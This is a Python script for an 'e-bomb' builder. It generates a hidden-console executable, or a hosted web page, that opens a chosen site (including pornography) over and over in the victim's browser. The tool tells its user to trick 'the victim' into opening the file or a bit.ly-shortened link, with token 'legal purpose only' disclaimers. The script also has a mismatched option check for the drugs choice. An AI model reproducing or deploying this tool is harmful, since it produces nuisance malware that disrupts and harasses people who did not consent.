import os
from time import sleep

print("[*] Starting Bomb... \n") 
a = "google.com"
print("      ____    ____   __    __     ____   ")
sleep(0.2)
print("          \  /    \    \  /  |        \  ")
sleep(0.2)
print("          /        \    \/   |        /    Created by @lucagamerro")
sleep(0.2)
print("          \        /         |        \    Use this tool for legal purpose only!")
sleep(0.2)
print("      ____/     __/        __|    ____/  \n \n \n")
sleep(0.5)
    
print("[*] Choose the type of sites du you want to insert on the e-bomb\n")
sleep(0.2)
print("[1] Classic. ")
sleep(0.2)
print("[2] Social. ")
sleep(0.2)
print("[3] Phonrnographia. ")
sleep(0.2)
print("[4] Drugs.")
sleep(0.2)
print("[5] Custum. \n\n")
sleep(0.5)
quale = input("[?] Select the number: ")

if quale == "1":
    a = "www.google.com"
    b = "classic"
elif quale == "2":
    a = "www.facebook.com"
    b = "social"
elif quale == "3":
    a = "pornhub.com"
    b = "porno"
elif quale == "4":
    a = "https://proxy.duckduckgo.com/iu/?u=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F1200%2F1*h4fYlIBe-41SOGVpuQGgrA.png&f=1"
    b = "droga"
elif quale == "5":
    a = input("[?] Site do you want to insert in to the bomb: ")
    b = "custum"
elif quale == "exit":
    exit()
else: 
    print("[!] Invalid selection.")
    exit()

print("\n\n\n")
sleep(0.2)
print("[*] Choose the type of e-bomb do you want: \n")
sleep(0.2)
print("[1] Executable version (send a file to the victim). ")
sleep(0.2)
print("[2] Website version (open many pages on the browser). \n\n")
sleep(0.5)
tipo = input("[?] Select the number: ")

if tipo == "1":
    script = open("executable.py", "w")
    script.write("import subprocess \n")
    script.write("a = 0 \n")
    script.write("while a == 0: \n")
    firefox = '    subprocess.run(["firefox", "' + a + '"])'
    script.write(firefox)
    script.close()
    print("[*] Macking bomb... \n")
    os.system('pyinstaller executable.py --onefile --noconsole | grep "completed successfully."')
    sleep(1)
    print("\n[*] File created. ")
    sleep(0.2)
    print("[*] Saved as /dist/executable.exe")
    sleep(0.2)
    print("[*] Now use your skills to make the victim open the e-bomb.")
    print("[*] Use it for legal purpose only!")
    sleep(1)
    exit()
elif tipo == "2":
    if b == "classic":
        print("[*] Now chose a domain \n")
        os.system("surge ")
        print("[*] All done, now send to the victim the link domain.surge.sh/classic.html using bit.ly")
        print("[*] Use it for legal purpose only!")
        exit()
    elif b == "social":
        print("[*] Now chose a domain \n")
        os.system("surge ")
        print("[*] All done, now send to the victim the link domain.surge.sh/social.html using bit.ly")
        print("[*] Use it for legal purpose only!")
        exit()
    elif b == "porno":
        print("[*] Now chose a domain \n")
        os.system("surge ")
        print("[*] All done, now send to the victim the link domain.surge.sh/porn.html using bit.ly")
        print("[*] Use it for legal purpose only!")
        exit()
    elif b == "drugs":
        print("[*] Now chose a domain \n")
        os.system("surge ")
        print("[*] All done, now send to the victim the link domain.surge.sh/drugs.html using bit.ly")
        print("[*] Use it for legal purpose only!")
        exit()
    elif b == "custum":
        print("[*] Now chose a domain \n")
        os.system("surge ")
        print("[*] All done, now send to the victim the link domain.surge.sh/custum.html using bit.ly")
        print("[*] Use it for legal purpose only!")
        exit()
    else:
        exit()
    